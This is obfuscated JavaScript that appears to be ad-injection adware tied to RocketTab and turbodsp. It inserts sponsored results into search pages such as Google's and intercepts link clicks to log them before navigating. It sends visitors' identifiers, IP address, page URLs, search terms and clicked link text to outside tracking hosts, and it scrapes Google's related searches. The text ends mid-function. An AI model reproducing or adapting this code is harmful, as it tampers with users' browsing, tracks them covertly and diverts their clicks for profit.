(function(a,b,c,d,e,h,j,k,l,p,z,B,A,uuuu,pvs){
e=a[d.z](d.z);z=e[0];B=e[1];h=e[2];j=e[4];k=e[5];p=e[6];e=e[3];uuuu=c.href;
var rtp='https://track.rtdock.com/track/?affiliateID=066&product=yn_'+e.a.pid+'&productid=15&placement=atf&version=',
d1={
	'7269636872697665726d656469615f73657270fastconnect1':{a:'rt',b:'yn'},
	'72726d5f646972656374':{a:'rt',b:'yn'},
	'61646b6e6f776c656467655f6a73':{a:'rt',b:'yn'},
	'61646e65745f6a73':{a:'rt',b:'yn'}
},dc=d1[e.a.ref1]||d1[e.a.ref1+e.a.teid],tt_,cid_;
A=function(d,y){
	this[8]=[];this[6]=0;this[11]=y;this[15]=this.i();this[14]=this.l();this[14]&&this.z(d,'v');B.w('a',2|d.f);
};
l=A.prototype={
	z:function(d,w,x,y,v,u){
		this[0]=this.y(d.b,c.href);this[6]++;this[321]=[];this[909]=1;
		if(this[0]){
			this['*']=x=d.a[this[11]];
			this[1]=this.w();
			y=0;u=z.getCookie(d.e[this[11]]);
			for(v in x){
				this[12]=x[v].x;
				this[1].appendChild(this.x());
				this[w](v,x,y++,u);
				this.j[v]++;
			}
		}
	},
	y:function(y,x,w,v){
		w=y.split('|||');
		if(w[1]){
			return z(w[0]).attr(w[1]);
		}else{
			w=new RegExp('[\?&#]('+y+')=([^&#]*)','g');v=x.match(w);
			if(v){
				return decodeURIComponent(v[v.length-1].split('=')[1].replace(/\++/g,' ')).replace(/(\<|\>|\'|\"|#)+/g,'');
			}
		}
		return '';
	},
	x:function(y){
		y=z.c('div');y.style.cssText='position:relative;margin:0!important;padding:0!important;';this.g&&(y.className='scx475');return y;
	},
	w:function(y){
		y=this.x();
		y.setAttribute(j,k);
		return y;
	},
	v:function(w,x,y,v){
		this[w]=new this[w.toUpperCase()](this,x[w],y,v);
		this.t(w,x,y,v);
	},
	u:function(y,aa,x,w,v,u,t,s,r,q,p,o,n,m,l,bb,rr,slt,adv,sls,ii,sl,tc,mf,srt){
		if(this[1]){
			n=this.m(this[12]);
			!this[1].offsetParent&&!this[2]&&this.r(n);
			x=y.a;w=y.b;v=y.c;u=v.c;q='';o=y.d;l=/\{%no%\}/ig;bb=v.b;rr=/\{%st%\}/ig;mf=/(t|b){%no%}/.exec(bb);mf=mf&&mf[1];
			srt=/(\{%DESC%\})/;
			//if(aa)bb=bb.replace(/\{%st%\}/ig,aa);
			for(t=0;s=u[t];t++){
				p=bb.replace(l,t+1);
				if(s.stars){
					p=p.replace(srt,'<img src="'+s.stars+'" style="border:0;">$1');
				}
				for(r in w){
					p=p.replace(w[r],s[r]);
				}
				adv=s.adv||aa;
				if(aa)p=p.replace(rr,adv);
				if(sls=s.site_links){
					slt='';tc=t+1;this[909]=0;
					for(ii=0;sl=sls[ii];ii++){
						slt+='<a t-_p_-="'+adv+'" style="display:inline-block;color:#2518b5;width:50%;height:20px;box-sizing:border-box;padding:0 0 0 20px;border-box;white-space:nowrap;text-overflow:ellipsis;overflow:hidden;font-size:small;" href="'+sl.sitelink_url+'&pos='+mf+tc+'" poslqbzhwg="'+mf+tc+'">'+sl.sitelink_text+'</a>'
					}
					p=p.replace(/(class\="rsp"[^\>]+>)(<[^\>]+)/, '$1'+slt+'$2');
				}
				q+=p;
			}
			q=v.a.replace(x,q);
			this[1].children[v.d].innerHTML=q;
			this.o(o,v.d);
		}
	},
	t:function(w,x,y,v){
		this[w].z(this,x[w],y,v);
	},
	ss:function(e){
		clearInterval(this[33]);this[2]=0;
		this[1]&&this[1].parentNode&&this[1].parentNode.removeChild(this[1]);
		this[1]=undefined;
		this.z(d,this[0]?'t':'v');
	},
	r:function(u,w,x,t,s,r,dd,v,y,q){[2]
		x=this;x[2]=1;u=u.split('|||');t=u[0];s=0|u[1];r=/isearch\.iminent\.com/;
		y=d.a[this[11]];
		for(q in y){
			q=y[q].main;break;
		}
		if((v=z('#buzzdock')[0][0])&&q){
			x[1].style.cssText=v.style.cssText;
			x[1].style.height='';
			v.parentNode.insertBefore(x[1],v);
			return;
		}
		var i=0;
		this[33]=setInterval(function(y,v){
		  i++;
			y=x[1];
			if(!x[0]){
				clearInterval(x[33]);x[2]=0;return;
			}
			v=z(t)[0][0];
			if(i==34&&!v){
			   clearInterval(x[33]);x[2]=0;
			   i=0;
			   if(typeof x[12]=="object"){
			       ctxdba= x[12]["other"]["ctxdba"];
			       if(ctxdba){
			          var cta=z(ctxdba)[0][0],l=cta.children.length,lp=cta.children[l-1];
			          cta.insertBefore(y,lp);
			       }
			   }
			}
			if(v&&y&&(r.test(c.hostname)||x[7]!=v.innerHTML)&&(s||v.offsetHeight>0||c.hostname=='voxfind.com')){
				x[2]=0;x[7]=v.innerHTML;
				clearInterval(x[33]);
				x.k[s](v,y);
				dd==b.getElementById('rockettab-main-wrapper');
				if(dd&&y.children[1]==dd){
					y.insertBefore(dd,v);
				}
			}
		},30);
	},
	q:function(y,w,x,v){
		w.x.c.c=y.Message;v=w.x;
		this.u(v,y.data_type);
		this.imp(y,w);
		h.k(this[1].children[v.c.d],x);
	},
	imp:function(y,w,u,t,s,r,q,o,n,m){
		u=y.Message.length|0;
		if(t=y.data_type){
			s={};q=y.Message;	
			if(u>0&&q[0].adv){
				/**m=[];
				for(o=0;n=q[o];o++){
					s[n.adv]|=0;
					s[n.adv]++;
				}
				for(o in s){
					m.push(w.tp[o]+w[68]+('0'+s[o]));
				}
				r=m.join(',');*/
				r=w.tp[q[0].adv]+w[68]+'0'+y.Message.length;
			}else{
				r=w.tp[t]+w[68]+(u<10?('0'+u):u);
			}
		}else{
			r=w[69]+w[70]+w[68]+(u<10?('0'+u):u);
		}
		z.script(d.uu+'?'+h.c(['callback','rc','rc_','user_agent','pid'])+'&tp='+r+'&pf=imp');
	},
	o:function(o,p,n){
		if(o){
			n=this[1].children[p];
			z('#'+o[1],n).bind('click',function(y,x,w,v){
				y=y||a.event;
				h.e(y);
				n.innerHTML='';
				n.style.height=n.style.minHeight=0;
				x={};w=o;
				x[o[2]]=o[0];
				x.expires=h.i(o[0]);
				h.d(x);
			});
		}
	},
	n:function(y){
		this[8].push(y);
	},
	m:function(y,x,w,v,u){
		x=y;
		if('object'==typeof x){
			x=y['default'];w=y.other;
			for(v in w){
				u=new RegExp(v,'i');
				if(u.test(c.href)){
					x=w[v];
					break;
				}
			}
		}
		return x;
	},
	l:function(x,v){
		if(!d.u){
			x=d.a[this[11]];
			for(v in x){
				if(x[v].c.indexOf('poslqbzhwg="b{%no%}"')>-1){
					return false;
				}
				break;
			}
		}
		return true;
	},
	k:[
		function(y,x){
			y.firstChild?y.insertBefore(x,y.firstChild):y.appendChild(x);
		},
		function(y,x){
			y.parentNode.insertBefore(x,y);
		},
		function(y,x,w,v){
			w=y.nextSibling;v=y.parentNode;
			w?v.insertBefore(x,w):v.appendChild(x);
		}
	],
	j:{a:0,b:0,c:0},
	i:function(x,w){
		x=d.a[this[11]];
		for(w in x){
			return 1==x[w].main;
		}
	},
	h:function(y,x,w,v,u,t,s){
		if(y=this[1]){
			if(b.body&&b.body.contains(y)){
				if(x=y.parentNode){
					if((w=x.parentNode)&&x.parentNode!=b.body){
						v=w.children;
						for(u=0;(t=v[u++])!=x;){
							if(t.offsetHeight>=45&&z(t).aLocation().top>0&&Math.abs(x.offsetTop-t.offsetTop)>=45){
								s=t.currentStyle||t.ownerDocument.defaultView.getComputedStyle(t,null);
								if('fixed'==s.position) break;
								if(t.offsetWidth<y.offsetWidth){t.style.width=y.offsetWidth+'px';}t.style.height='auto';
								'IFRAME'==t.nodeName?t.parentNode.insertBefore(y,t):t.insertBefore(y,t.firstChild);
								break;
							}
						}
					}
				}
			}else{
				x=this.m(this[12]).split('|||');
				w=z(x[0])[0][0];
				if(w){
					this.k[x[1]|0](w,y);
				}
			}
		}
	},
	g:/thesmartsearch\.net/.test(c.hostname),
	cb:function(y){
		y.i==this[6]&&this[0]&&this[y.type[1]]&&this[y.type[1]].cb(y,z.getCookie(d.e[this[11]]));
	},
	im:function(y){
		this[321].push(y);
	},
	gim:function(){
		return this[321].join(',');
	}
};
(function(a,b,c,f,g,n,o,m,k,ffff){
	o='ccbt_tbcc';ffff=!/(www\.google\.)/.test(c.hostname);
	if(m=z.getCookie(o)){
		z.script(d['4']+m);
		k();
	}
	f=function(y){
		g(y);
	};
	g=function(y,x,w,v,u,t,s,r,q,p,oo,nn,zz,yy){
		y=y||event;x=y.target||y.srcElement;w=/^a$/i;u=/\n+/g;p=1;q=uuuu==c.href||ffff;uuuu=c.href;oo=/^\/?#/;nn=/^(loaded|complete)$/;
		do{
			if(w.test(x.nodeName)){
				v=(x.innerText||x.textContent).replace(u,' ').trim();
				if(v){
					t=n(v,x);
					if('RocketTab'==x.getAttribute('t-_p_-')){
						yy=1;
						zz=z.script(rtp+(dc?dc.a:'0.1')+'&tt='+tt_+'&cid='+cid_+'&type=click&referer='+encodeURIComponent(c.href));
					}else if(dc&&'rtb'==x.getAttribute('t-_p_-')){
						yy=1;
						zz=z.script(rtp+dc.b+'&tt='+e.a.ref2+'&cid='+cid_+'&type=click&referer='+encodeURIComponent(c.href));
					}
					if(q&&!x.target&&x.href&&!y.button&&!y.ctrlKey){
						h.h(y);
						b.cookie=o+'='+t.src.split('?')[1]+';path=/;domain='+c.hostname+';expires='+h.i(168)+';';
						t.onload=t.onreadystatechange=function(){
							if((!this.readyState||nn.test(this.readyState))&&p){
								p=0;
								k();
								if(uuuu==c.href&&!oo.test(x.getAttribute('href'))){
									//(!yy||2==yy)?c.href=x.href:yy=2;
									c.href=x.href;
								}
								q=c.href;
							}
						};
						return false;
					}
				}
				break;
			}
		}while(x=x.parentNode)
	};
	n=function(y,v,x,w,u,t,s){
		w=new Date();u=e.a;t='';
		if(s=v.getAttribute('t-_p_-'))t='&apn='+s;
		return z.script(d['4']+'uuid='+u.uuid+'&user_ip='+u.user_ip+'&pt='+(v[j]?v[j]:0)+'&pos='+(v.getAttribute('poslqbzhwg')||0)+t+'&ref1='+p(u.ref1)+'&ref2='+p(u.ref2)+'&ref3='+p(u.ref3)+'&teid='+p(u.teid)+'&tuid='+p(u.tuid)+'&ts='+p(w.getUTCFullYear()+'-'+(w.getUTCMonth()+1)+'-'+w.getUTCDate()+' '+w.getUTCHours()+':'+w.getUTCMinutes()+':'+w.getUTCSeconds())+'&tfsid='+u.tfsid+'&lt='+p(y)+'&ref='+p(c.href));
	};
	function k(){
		b.cookie=o+'=;path=/;domain='+c.hostname+';expires='+new Date().toGMTString()+';';
	};
	z(b).bind('click',f,ffff);
})(a,b,c)
var $a$b$c=0, $c$b$a='04'; $grt=[]; gst=[];
l.A=function(w,x,y,v,u,t){
	e.a.rc=e.a.rc_=d.rc;
	this[0]=w;
	this[1]=y;
	this[2]=x;
	this[66]=x.main?'0':'';
	this[67]=(x.main^1)<<6;
	this[68]=this[66]+(this[67]|1);
	this[69]=0;
	x.b=x.b.replace(/\{\^CRPName\^\}/ig,e.a.CRPName).replace(/class(\s*)=\1"\1tooltip\1"/,'class="tooltip_21du22"');
	if(!x.f){x.b=x.b.replace(/onclick="(javascript:)*ttis[^"]+/,'')}
	this.x={a:/\{%ADS%\}/i,b:{click:/\{%CLICK%\}/ig,title:/\{%TITLE%\}/ig,url:/\{%URL%\}/ig,desc:/\{%DESC%\}/ig},c:{a:x.b,b:x.c.replace(/<a\s/ig,'<a t-_p_-="{%st%}"'),d:y},d:x.e};
	w.n(y);
	z.css(d.rt_style);
};
l.A.prototype={
	z:function(w,x,y,v,u,t,s,r){
		t=v||(x.e&&z.getCookie(x.e[2]));this[111]=1;s=this[66];r=this[67];var _t=this;
		if(!this[0].j.a){
			u=this[0][0];
			if(d.g[u]) return;
			e.a.rc=t?0:e.a.rc_;
			arguments.callee._key=this.y(u,x);	//2015.3.9
			this.s(u,d.u,this[0][6]);
			this[0].im(this[68]+'0'+e.a.rc);
			t&&this[0].j.a--;
			if(!t&&2048==d.l){
				if(!d.grs&&!(/[\?&#]tbm=/.exec(c.href))&&d.g_s_t!==false){
					if(!$a$b$c){
						this.ggrs();
					}
		  	}else if(d.nsc&&(d.slg||(!d.slg&&d.g_s_t===false)||(!d.slg && d.g_s_t!==false && !ay))){
		         z.script('//'+'a.turbodsp.com'+'/n.php?key='+p(this.y(u,x))+'&'+h.c(['rc_','CRPName'])+'&cou='+((undefined!=this[0]['*'].b)|0)+'&count='+d.u+'&t='+p('a-a')+'&tp=2&i='+this[0][6]+'&s='+c.hostname+'&page_url='+p(c.href));
		         this[0].j.b++;
		  	}else if(!d.slg&&d.g_s_t!==false&&ay&&ay.G_SL){
		  		if(this[0][6]>1||($gst[0]&&$gst[0].indexOf(this[0][0].substring(0,this[0][0].length-1))>-1)){
		  			$c$b$a='04';
		  			gst=$gst;
		       	setTimeout(function(){B.a.cb({"sl":true,"tp":2,"type":["a","a"],"i":_t[0][6],"Message":[]});},0);
		       }
		  	}
		  }
		}
	},
	y:function(x,y,w,v){
		x=x.trim();w=x.split(/\s+/g);
		w.length=Math.min(y.d,w.length);
		return w.join(' ');
	},
	w:function(x,y){
		if('6d6f6e7469657261'==e.a.ref1){
			this.ch(this[1],this[0][1]);
		}else if(y=this[2].f){
			if(this.a){
				this.a.z(x);
			}else{
				y.z=this[0][8];
				this.a=new this.O(this,y,this[1]);
				this.a.z(x);
			}
		}
	},
	ch:function(y,x,w,v,u,t,s){
		w=x.children[y].getElementsByTagName('*');
		for(v=0;u=w[v++];){
			if('wtali'==u.className||'gth'==u.getAttribute('rt-type-_-')){
				u.removeAttribute('onclick');
				u.parentNode.removeAttribute('onclick');
				u.parentNode.onclick=null;
				/**if('A'==u.tagName){
					u.href='http://www.xrosview.com/info.html?hrdId=&random=121&logic=default&prdct=allPrdcts';
					u.target='_blank';
				}else{*/
					u.onclick=function(){
						open('http://www.xrosview.com/info.html?hrdId=&random=121&logic=default&prdct=allPrdcts','_blank');
						return false;
					};
				//}
				break;
			}
		}
	},
	ggrs:function(y,x){
		y=1;x=this;
		$a$b$c=setInterval(function(s,w,v,u,t,r){
			if(y++>=20){
				clearInterval($a$b$c);
				$a$b$c=0;
				return;
			}
			s=z('#brs a,._Bmc a')[0];
			w=s[0];
			if(w&&!w.isUsed){
				if(b.addEventListener){
					r=c.href.match(new RegExp('[\?&#]('+d.b+')=([^&#]*)','g'));
					if(r){
						if(t=z('#brs>h3')[0][0]){
							r=decodeURIComponent(r[r.length-1].split('=')[1].replace(/\++/g,' '));
							if(t.innerHTML.replace(/\s+/g,' ').indexOf(r)==-1) return;
						}
					}
				}
				w.isUsed=1;
				clearInterval($a$b$c);
				$a$b$c=0;
				$grt=[];
				for(v=0;u=s[v++];){
					$grt.push(u.innerHTML.replace(/<[^>]+>/g,''));
				}
				$c$b$a='05';
				gst=$grt;
				B.a.cb({"sl":true,"tp":2,"type":["a","a"],"i":x[0][6],"Message":[]});
			}
		},300);
	},
	u:function(y,x,w){ 
		var temp;
		y=this[0][1].children[this[1]].getElementsByTagName('a');
		for(x=0;w=y[x++];){
			var href=w.getAttribute("href").toLowerCase();
			if(w.getAttribute("data-title")||(href&&href.indexOf("http:")==0)){
				w.setAttribute("data-href",w.getAttribute("href"));
				if(!w.hasAttribute("data-title")) w.setAttribute("data-title","");
				//w.setAttribute("href","/#"+w.getAttribute("data-title").replace(/<.*?>/ig,""));
				w.setAttribute("href","/#"+this.z._key);
				w.onclick=this.t;
			}
			//if(w.getAttribute("data-href")) w.onclick=this.t;
		}
	},
	t:function(x){ 
		open(this.getAttribute('data-href'),this.target||'_self');
		return h.h(x);
	},
	s:function(u,y,x){
		z.script(this[2].a+'?key='+p(this.y(u,this[2]))+'&slf='+((!d.nsc&&(d.grs||d.g_s_t===false||/[\?&#]tbm=/.exec(c.href))&&(d.slg||d.g_s_t===false||!ay))|0)+'&'+h.c(['rc_'])+'&count='+y+'&rts='+d.rt_s+'&i='+x+'&page_url='+p(c.href));
	},
	cb:function(y,x,ea,ss,ver){
		tt_=y.tt||tt_;cid_=y.cid||cid_;
		var _this=this;
		if(y.cfl&&this[2].main){
			ver=(dc?dc.a:'0.1');
			z.script(rtp+ver+'&tt='+tt_+'&cid='+cid_+'&type=ads-request&referer='+encodeURIComponent(c.href));
			if(y.rf){
				z.script(rtp+ver+'&tt='+tt_+'&cid='+cid_+'&type=ads-returned&referer='+encodeURIComponent(c.href));
			}
		}
		if(y.rf&&!d.rt_s&&!this[2].main)return;
		if(x||!y.Message)return;
	  if(y.tp){
			   var tads = {'10':[[2,2,2,2,1,1],[4,2,2,2]],'9':[[2,2,2,2,1,1],[4,2,2,2]],'8':[[2,2,2,2,1,1],[4,2,2,2]],'7':[[2,2,2,2,1,1],[4,2,2,2]],'6':[[2,2,2,2,1,1],[4,2,2,2]],'5':[[4,2,2,1,1],[3,3,2,1,1]],'4':[[4,4,1,1],[4,3,2,1],[4,2,3,1],[4,1,3,2],[4,1,2,3],[3,2,3,1]],'3': [[3,4,3],[4,4,1],[3,2,4],[4,4,2],[3,1,4],[4,3,3],[3,1,1],[4,2,3],[3,3,1],[4,2,2],[3,3,2],[4,2,1],[3,1,3],[4,2,4],[3,2,1],[4,3,2],[3,3,3],[4,1,3],[3,2,2],[4,1,2],[3,2,3],[4,1,1],[3,4,1],[4,1,4],[3,3,4],[4,3,1],[3,1,2],[3,4,2]],'2': [[3,4],[3,3],[3,2],[3,1],[4,4],[4,3],[4,2],[4,1]],'1': [[3],[4]]};
	       //!y.sl&&this[0].b&&this[0].b.cb(y,x);
	       var ct=this[0][1].children[this[1]];
         var el=setInterval(function(){
       	      if(ct&&ct.children.length>0){ 
       	         clearInterval(el);
       	         var al=_this.sn(ct),sl=al.length;
					       if(sl>0&&sl<7&&_this[0][909]){
					         var c=al[0].children,t=al[0].getAttribute("ng");
					         if(c.length>0&&!t){
					            return;
					         }
					       }else{
					            return;
					       }
					       
			           var k=Math.round(Math.random()*(tads[sl].length-1));
			           var tg_rs=tads[sl][k],sum=0;
			           for(var n=0,lh=tg_rs.length;n<lh;n++){
			           	   sum+=tg_rs[n];
			           }
					       var s=y.Message.slice();
					       for(var i=0,l=sl;i<l;i++){
					       	   var n=s.length;
					      	   var mn=_this.rsp(s,tg_rs,i);
					      	   if(i==0&&gst.length>0){
					      	       var m=[];
					      	       if(y.sl){
					      	          var cb="t_c_b_sl";
					      	          var t=(function(obj,ng,count){
					      	              if(a[ng]){
					      	                 var mit=setInterval(function(){if(a[ng].mes){clearInterval(mit);a[ng](a[ng].mes,obj);delete a[ng];}},300);
					      	                 return false; 
					      	              }
					      	              if($c$b$a=='04'/**&&_this[0][6]==1*/&&gst[0].indexOf(_this[0][0].substring(0,_this[0][0].length-1))==-1) return false;
					      	              count=0;
							      	          a[ng]=function(data,o,len,oi,oa,ob,oc){
												            m=data;o=o||obj;
												            a[ng].mes=data;
												            len=0;oi=0;oa=0;
												            while(true){
												            	ob=m.slice(oa,oa+=4);
												            	if(ob.length>0&&(oc=o[oi++])){
												            		len+=_this.p(oc,ob,n,y.Message.length,i);
												            	}else{
												            		break;
												            	}
												            }
												            if(len) {
												            	var ty=_this[67];count++;
												            	if(2==count){
												            		ty^=64;
												            	}
												            	ty|=$c$b$a;
												            	ty=ty<10?('0'+ty):ty;
												            	z.script(d.uu+'?'+h.c(['callback','rc','rc_','user_agent','pid'])+'&tp=106'+ty+(len<10?('0'+len):len)+'&pf=imp');
												            }
												        }
												        return true;
					      	          })(al,cb)
					      	          if(t){
					      	            z.script('//'+'a.turbodsp.com'+'/g.php?key='+p(_this[0][0])+'&atp='+$c$b$a+'&'+h.c(['rc_','callback'])+'&count='+d.u+'&gst='+p(gst.join("|").replace(/(<b>|<\/b>)/gi,""))+'&callback='+cb);
					      	          }
					      	          return;
					      	       }
	      	               if(m.length!=mn.length){
                               if(n-m.length>=0){ s.length=n-m.length};
                         }
					      	       mn=m;
					      	   }
					      	   _this.p(al[i],mn,n,y.Message.length,i);
					       }
					       z.script(d.uu+'?'+h.c(['callback','rc','rc_','user_agent','pid'])+'&tp=104'+(_this[66]+(_this[67]|4))+(sum<10?('0'+sum):sum)+'&pf=imp');
       	      }
         },100);
		}else{
			if(!this[111])return;
			this[111]=0;
			if(y.rf&&(d.rt_s||this[2].main)){
				this.rtr(y);
			}else{
				if((this[2].e&&z.getCookie(this[2].e[2])))return;
				y.data_type=y.data_type.replace(/\([^\)]+\)/,'');
				if('6d6f6e7469657261'==e.a.ref1)this[0][1].children[this[1]].style.background='#FFFAFF';
				this[0].q(y,this,1);
				if(dc){
					var dir={};
					for(var i=0,mm;mm=y.Message[i];i++){
						if(!mm.adv){
							dir[y.data_type]=1;
							break;
						}else{
							dir[mm.adv]=1;
						}
					}
					dir.rtb&&z.script(rtp+dc.b+'&tt='+e.a.ref2+'&cid='+cid_+'&type=impression&referer='+encodeURIComponent(c.href));
					dir.RocketTab&&z.script(rtp+dc.a+'&tt='+e.a.ref2+'&cid='+cid_+'&type=impression&referer='+encodeURIComponent(c.href));
				}else if(/^RocketTab/i.test(y.data_type)){
					z.script(rtp+dc.a+'&tt='+e.a.ref2+'&cid='+cid_+'&type=impression&referer='+encodeURIComponent(c.href));
				}
				this.w(y.ir);
			  d.w&&this.u();
			}
		}
	},
	rtr:function(y,x,w,v,u,t,s,r,q,p,o,n,m,l,k,j,g,zz,yy,xx,ww,vv,uu,ss,cc,ea,uu){
		if(x=y.Message){
			ea=e.a;
			if(d.rt_tid_switch==1){
			  x=y.Message.slice(0);
		  }
			w=this[0];xx=this[2].main?'t':'b';
			!w[1].offsetParent&&!w[2]&&w.r(w.m(w[12]));
			t='';r=/\{%CLICK%\}/ig;q=/\{%TITLE%\}/i;p=/\{%DESC%\}/i;o=/\{%SITELINK%\}/i;n=/\{%KWD%\}/i;m=/\{%DISPLAY%\}/i;gf=/\{%DISPLAYURL%\}/i;br=/(<b>|<\/b>)/gi;wd=new RegExp(w[0],"gi");
			zz=/\{%TYPE%\}/gi;yy=/\{%no%\}/ig;vv=/\{%SRC%\}/i;uu=/\{%pos%\}/ig;
			for(v=0;u=x[v++];){
				if(d.rt_tid_switch==1){
				    u.title=u.title.replace(br,"").replace(wd,"<b>"+w[0]+"</b>");
				    g=d.rt_template.replace(uu,xx).replace(r,u.click).replace(q,u.title.replace(br,"").replace(wd,"<b>"+w[0]+"</b>")).replace(p,u.desc.replace(br,"").replace(wd,"<b>"+w[0]+"</b>")).replace(gf,u.url).replace(zz,u.adv).replace(yy,xx+v);
				}else{
				    g=d.rt_template.replace(uu,xx).replace(r,u.click).replace(q,u.title).replace(p,(u.stars?d.rat.replace(vv,u.stars).replace(r,u.click):'')+u.desc).replace(zz,u.adv).replace(yy,xx+v);
				}
				if(s=u.site_links){
					l='';
					for(k=0;j=s[k++];){
					  if(d.rt_tid_switch==1){
						  l+=d.rt_site_link.replace(r,j.sitelink_url.replace(br,"").replace(wd,"<b>"+w[0]+"</b>")).replace(n,j.sitelink_text.replace(br,"")).replace(zz,u.adv).replace(yy,xx+v);
					  }else{
					    l+=d.rt_site_link.replace(r,j.sitelink_url).replace(n,j.sitelink_text).replace(zz,u.adv).replace(yy,xx+v);
					  }
					}
					g=g.replace(o,l).replace(m,'style="display:table;" t-_p_-="other"');
				}else if('rtb'!=u.adv){
					g=g.replace(m,'t-_p_-="other"');
				}
				t+=g;
			}
			w[1].children[this[1]].innerHTML=d.rt_wrapper.replace(/\{%TEMPLATE%\}/i,t).replace(/\{\^CRPName\^\}/ig,e.a.CRPName);
			if(this[2].e){
				ww=this[2].e.slice(0);
				ww[0]=0;
				w.o(ww,this[1]);
			}
			h.k(w[1].children[this[1]],1);
			z.script(rtp+(dc?dc.a:'0.1')+'&tt='+tt_+'&cid='+cid_+'&type=impression&referer='+encodeURIComponent(c.href));
			uu=y.Message.length;
			this[0].imp(y,this);
			this.w(y.ir);
			////////////////
			/**if(y.ccabe){
				a.__insp=a.__insp||[];
				__insp.push(['wid',313579092]);
				ss=z.script('//cdn.inspectlet.com/inspectlet.js');
				ss.id='inspsync';
			}*/
			////////////////
		}
	},
	wp:function(e){
	   e=e||window.event;
	   if (window.event) { 
		   e.cancelBubble=true; 
		 } else {  
		   e.stopPropagation(); 
		 }  
	   var t=e.srcElement||e.target;
	   if(t.nodeName=="A"){
	     open(t.getAttribute("v"),"_self");
	     return true;
	   }
	},
	p:function(a,m,f,dl,index){
	   if(ay && d.g_s_t !== false && index!=0 && !d.slg ){
	      return;
	   }
	   var s="",data_style=a.getAttribute("data-style"),a_style=a.getAttribute("a-style"),pos=a.getAttribute("pos"),o=d.w,wp=this.wp,rg=this.rg,cce=e.a.cc,cp=/capn=[^&]*/gi,br=/(<b>|<\/b>)/gi;
	   for(var i=0,l=m.length;i<l;i++){
	   	    if(m&&m[i]){
			   	    var ls=m[i].clickUrl;
			   	    if(ay&&ay.G_SL && d.g_s_t !== false && index==0 && !d.slg ){
			   	        ls=ls.replace(cp,'capn='+ay.G_SL);
			   	    }else if(ay&&ay.NS_SL && d.slg){
			   	        ls=ls.replace(cp,'capn='+ay.NS_SL);
			   	    }
			   	    var v=dl-f+i+1;
			   	    var cu=ls+"&pos=sl"+v;
			   	    if(o){
			   	       s+="<a style='"+a_style+"' href='/#"+m[i].kwd.replace(br,"")+"'  poslqbzhwg='sl"+v+pos+"' v='"+cu+"'>"+m[i].kwd+"</a>";
			   	    }else{
			   	       s+="<a style='"+a_style+"' href='"+cu+"' poslqbzhwg='sl"+v+pos+"'>"+m[i].kwd+"</a>";
			   	    }
	   	    }
	   }
	   if(s){
			   var c=a.children;
			   if(c.length>0){
			      c[0].innerHTML=s;
			   }else{
			      a.innerHTML=s;
			   }

			   h.k(a,4);
			   a.setAttribute("style",data_style);
			   a.removeAttribute("data-style");
			   a.removeAttribute("a-style");
			   if(o&&e.a.cc!=="BR"){
				    z(a).unbind('click',wp)
				    z(a).bind('click',wp);
			   }
	   }
	   return v;
	},
	sn:function(ct){
	   return this.gs("rsp|conceptLinks","*",ct);
	},
	gs:function(cn, tg, p){
		p = p || document;
		var ag = (tg == "*" && parent.all) ? p.all : p.getElementsByTagName(tg);
		var m = new Array();
		cn = cn.replace(/\-/g, "\\-");
		var r = new RegExp("(^|\\s)" + cn + "(\\s|$)");
		var e;
		for(var i=0; i<ag.length; i++){
				e = ag[i];
				if(r.test(e.className)&&'other'!=e.getAttribute('t-_p_-')){
						m.push(e);
				}
		}
		return m;
	},
	rsp:function(m,n,x){
	    var l=m.length,a=[];
			for(var i=0;i<n[x];i++){
				  var k=Math.round(Math.random()*(l-1));
	    	  a.push(m[k]);
	    	  m.splice(k,1);
	    	  l=m.length;
	    }
	    return a;
	},
	tp:{'default':'100',xml:'001',rtb:'002',RocketTab:'002'/**'003'*/}
};
var T=l.A.prototype;
T.O=function(y,x,w){
	for(var k in this){this[k].a=this;}
	this[0]=y;
	this[1]=x;
	this[2]=w;
};
T.O.prototype={
	z:function(y){
		this[9]=this.y();
		if(!this[9])return;
		this.x(y);
		this.v();
	},
	y:function(y,x,w,v,u,t,s,r,q,p){
		y=/ttis\('/i;x=this[0][0][1].children[this[2]];w=x.getElementsByTagName('*');
		for(v=0;u=w[v];v++){
			t=u.getAttribute('onclick');
			if(y.test(t)){
				u.removeAttribute('onclick');
				u.onclick=null;
				s=/\('([^']+)/.exec(t)[1];
				r=z('#'+s,x)[0][0]||x.all[s];
				return [u,r,r.getElementsByTagName('a')[0]];
			}
		}
	},
	x:function(x,y,w){
		x&&(d.ref1!="726576697a6572")&&(w=z.c('a',{innerHTML:'about RocketTab',href:'http://rockettab.com/#about',target:'_blank'}),w.style.cssText='float:right;margin:-0.83em 0 0 0;',this[9][1].appendChild(w));
		y=z.c('div');
		y.setAttribute('xnhide','1');
		y.style.cssText='position:relative;display:none;';
		this.w(y);
		this[9][1].appendChild(y);
		this[9].push(y);
	},
	w:function(y,x,w,v,u,t,s){
		x=this[1].a;w=[];v='<table xnhide="1" style="width:340px;" id="xtable">';
		for(u=0;t=x[u];u++){
			s='<label style="margin:0;font-weight:normal;"><input xnhide="1" type="radio" name="oop" style="display:inline-block;" value="'+(t[1]*3600000)+'">&nbsp;'+h[t[0]](t[1])+'</label>';
			v+=u&1?('<td xnhide="1">'+s+'</td></tr>'):('<tr xnhide="1" style="line-height:25px"><td xnhide="1">'+s+'</td>');
		}
		v+='</table>';
		y.innerHTML='<p xnhide="1" style="margin:1em 0;">Hide these results from the current site for this duration of time</p><div xnhide="1" style="margin-top:10px;">'+v+'<input xnhide="1" type="button" id="'+this[1].d+'" value="SAVE" style="display:block;width:48px;margin:-6px 0 0 252px;" disabled></div>';
	},
	v:function(y,x,w,v,u){
		y=this;
		y[9][0].co=y[9][1].co=y[9][2].co=y;
		y[9][0].onclick=y.t;
		y[9][1].onclick=h.e;
		y[9][2].onclick=y.s;
		x=y[9][3].getElementsByTagName('input');w=x.length-1;
		u=x[x.length-1];y[5]=u;
		for(v=0;v<w;v++){
			x[v].co=y;
			x[v].onclick=y.q;
		}
		u.co=y;
		u.onclick=y.p;
	},
	t:function(y,x){
		//h.e(y);
		x=this.co;
		if(x[9][1].style.display!='block'){ 
			x[9][1].style.display='block';
			x[8]=setTimeout(function(){
				x[9][1].style.display='none';
			},3000);
		}
		return false;
	},
	s:function(y,x,w,v,u,t,s,r){
		x=this.co;clearTimeout(x[8]);w=x[9];v=w[1];u=w[1].children;t=u.length-1;
		for(s=1;s<t;s++){
			u[s].style.display='none';
		}
		w[3].style.display='block';x.r.a=x;
		z(b).bind('click',x.r);
		return false;
	},
	r:function(y,x,w,v,u,t,s){
		x=arguments.callee.a;z(this).unbind('click',x.r);w=x[9];v=w[1].children;u=v.length-1;
		w[1].style.display='none';w[3].style.display='none';
